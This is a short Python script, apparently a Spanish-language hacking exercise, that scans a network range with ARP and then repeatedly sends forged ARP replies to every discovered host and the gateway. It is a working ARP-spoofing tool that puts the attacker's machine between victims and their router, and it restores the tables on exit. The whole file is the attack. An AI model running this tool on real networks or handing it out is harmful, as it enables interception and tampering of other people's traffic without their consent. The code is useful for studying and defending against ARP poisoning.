#!/usr/bin/env python
#_*_ coding: utf8 _*_

from scapy.all import *
from colorama import Fore, init
import argparse
import sys

init()

parse = argparse.ArgumentParser()
parse.add_argument("-r","--range",help="Rango a escanear o spoofear")
parse.add_argument("-g","--gateway",help="Gateway")
parse = parse.parse_args()


def get_mac(gateway):
	arp_layer = ARP(pdst=gateway)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	final_packet = broadcast/arp_layer
	mac = srp(final_packet, timeout=2, verbose=False)[0]
	mac = mac[0][1].hwsrc
	return mac

def scanner_red(rango,gateway):
	lista_hosts = dict()
	arp_layer = ARP(pdst=rango)
	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
	final_packet = broadcast/arp_layer
	answers = srp(final_packet, timeout=2, verbose=False)[0]
	print("\n")
	for a in answers:
		if a != gateway:
			print(
				"[{}+{}] HOST: {}  MAC: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, a[1].psrc, a[1].hwsrc)
				)
			lista_hosts.update({a[1].psrc: a[1].hwsrc})
	return lista_hosts

def restore_arp(destip,sourceip,hwsrc,hwdst):
	dest_mac = hwdst
	source_mac = hwsrc
	packet = ARP(op=2, pdst=destip, hwdst=dest_mac, psrc=sourceip, hwsrc=source_mac)
	send(packet, verbose=False)


def arp_spoofing(hwdst,pdst,psrc):
	spoofer_packet = ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
	send(spoofer_packet, verbose=False)

def main():
	if parse.range and parse.gateway:
		mac_gateway = get_mac(parse.gateway)
		hosts = scanner_red(parse.range, parse.gateway)
		try:
			print("\n[{}+{}] Corriendo...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
			while True:
				for n in hosts:
					mac_target = hosts[n]
					ip_target = n
					gateway = parse.gateway
					arp_spoofing(mac_gateway,gateway,ip_target)
					arp_spoofing(mac_target,ip_target,gateway)
					print("\r[{}+{}] Suplantando: {}".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, ip_target)),
					sys.stdout.flush()

		except KeyboardInterrupt:
			print("\n\nRestaurando tablas ARP...")
			for n in hosts:
				mac_target = hosts[n]
				ip_target = n
				gateway = parse.gateway
				restore_arp(gateway,ip_target,mac_gateway,mac_target)
				restore_arp(ip_target,gateway,mac_target,mac_gateway)
			exit(0)
	else:
		print("Necesito opciones")

if __name__ == '__main__':
	main()
